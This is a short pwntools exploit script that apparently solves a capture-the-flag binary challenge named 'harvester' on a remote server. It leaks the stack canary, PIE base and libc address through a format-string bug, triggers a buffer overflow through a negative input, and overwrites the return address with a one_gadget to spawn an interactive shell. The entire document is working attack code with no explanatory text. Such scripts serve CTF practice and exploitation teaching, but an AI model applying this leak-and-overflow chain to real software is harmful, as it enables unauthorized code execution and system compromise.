from pwn import *

#r = process('./harvester')
r = remote('188.166.172.13',31444)

def leak(num):
    r.recvuntil('> ')
    r.sendline('1')
    r.recvuntil('> ')
    r.sendline('%'+str(num)+'$p')
    r.recvuntil('Your choice is: ')
    leak = int(r.recvuntil('\x1b')[:-1],16)
    return leak

canary = leak(11)
log.info('Leaked canary: %s' % hex(canary))
pie = leak(13) - 0xeca
log.info('Leaked pie base: %s' % hex(pie))
libc = leak(21) - 231
#libc = leak(21) - 234 # local
log.info('Leaked __libc_start_main: %s' % hex(libc))
libc_base = libc - 0x21b10
#libc_base = libc - 0x26c20 # local
log.info('Libc base @ %s' % hex(libc_base))

# gadgets

system = libc + 0x2da40
bin_sh = libc + 0x19230a
pop_rdi = pie + 0x1063
pop_rsi_r15 = pie + 0x1061
one_gadget = libc_base + 0x4f3d5 
#one_gadget = libc_base + 0xcbd20 # local

# bof

r.recvuntil('> ')
r.sendline('2')
r.recvuntil('> ')
r.sendline('y')
r.recvuntil('> ')
r.sendline('-11')
r.recvuntil('> ')
r.sendline('3')
r.recvuntil('> ')

payload = 'A'*40
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(one_gadget)
payload += 'A'*8

r.sendline(payload)
r.interactive()
